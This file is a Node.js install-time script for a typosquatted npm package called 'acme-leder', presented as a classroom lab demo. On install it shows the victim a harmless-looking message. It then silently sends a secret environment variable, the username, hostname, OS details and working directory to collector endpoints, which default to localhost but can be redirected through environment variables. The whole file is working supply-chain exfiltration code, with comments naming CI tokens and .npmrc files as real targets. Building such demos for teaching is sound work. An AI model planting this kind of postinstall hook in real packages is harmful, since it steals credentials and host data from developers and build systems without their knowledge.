/**
 * LAB DEMO ONLY: runs at npm install time.
 * Sends instructor-controlled DEMO_SECRET to localhost collector.
 * No outbound internet; no real malware patterns.
 */

import http from "node:http";
import { spawn } from "node:child_process";
import os from "node:os";

const host = process.env.DEMO_COLLECTOR_HOST || "127.0.0.1";
const port = Number(process.env.DEMO_COLLECTOR_PORT || 5055);
const demoSecret = process.env.DEMO_SECRET || "";
const username = process.env.USER || process.env.USERNAME || "";

const body = JSON.stringify({
  attack: "typosquat-postinstall-demo",
  message:
    "If this were a real typosquat, this script could read CI tokens, .npmrc, cloud env vars, etc.",
  stolen: {
    demo_api_secret: demoSecret || "(DEMO_SECRET not set, export one for the demo)",
    os_username: username
  },
  disclaimer:
    "Educational lab payload only; sent to DEMO_COLLECTOR_HOST (Docker: service name collector). Not published to npm."
});

function notifyInstall() {
  // Victim sees a benign-looking line.
  // eslint-disable-next-line no-console
  console.log("[acme-leder] Running post-install sync…");
}

/**
 * Phone-home: silently alert the attacker dashboard that a victim installed this package.
 */
function phoneHomeAttacker() {
  const collectorHost = process.env.LAB_COLLECTOR_HOST || "127.0.0.1";
  const collectorPort = Number(process.env.LAB_COLLECTOR_PORT || "8000");

  let username = process.env.USER || process.env.USERNAME || "";
  try { username = os.userInfo().username; } catch { /* noop */ }

  const payload = JSON.stringify({
    package: "acme-leder",
    version: "2.0.1",
    hostname: os.hostname(),
    username,
    platform: `${process.platform} ${os.release()}`,
    cwd: process.env.INIT_CWD || process.cwd(),
    watched_env: { DEMO_SECRET: process.env.DEMO_SECRET ? "[set]" : "(unset)" },
  });

  return new Promise((resolve) => {
    try {
      const req = http.request(
        {
          host: collectorHost,
          port: collectorPort,
          path: "/v1/lab/install-alert",
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(payload),
          },
          timeout: 3000,
        },
        (res) => { res.resume(); res.on("end", resolve); }
      );
      req.on("error", () => resolve());
      req.on("timeout", () => { req.destroy(); resolve(); });
      req.write(payload);
      req.end();
    } catch { resolve(); }
  });
}

function send() {
  return new Promise((resolve) => {
    const req = http.request(
      {
        host,
        port,
        path: "/api/ingest",
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Content-Length": Buffer.byteLength(body)
        },
        timeout: 3000
      },
      (res) => {
        res.resume();
        res.on("end", resolve);
      }
    );
    req.on("error", () => resolve());
    req.on("timeout", () => {
      req.destroy();
      resolve();
    });
    req.write(body);
    req.end();
  });
}

notifyInstall();
await Promise.all([send(), phoneHomeAttacker()]);
// eslint-disable-next-line no-console
console.log(
  "[acme-leder postinstall] demo exfil sent to http://" + host + ":" + port + "/api/ingest"
);
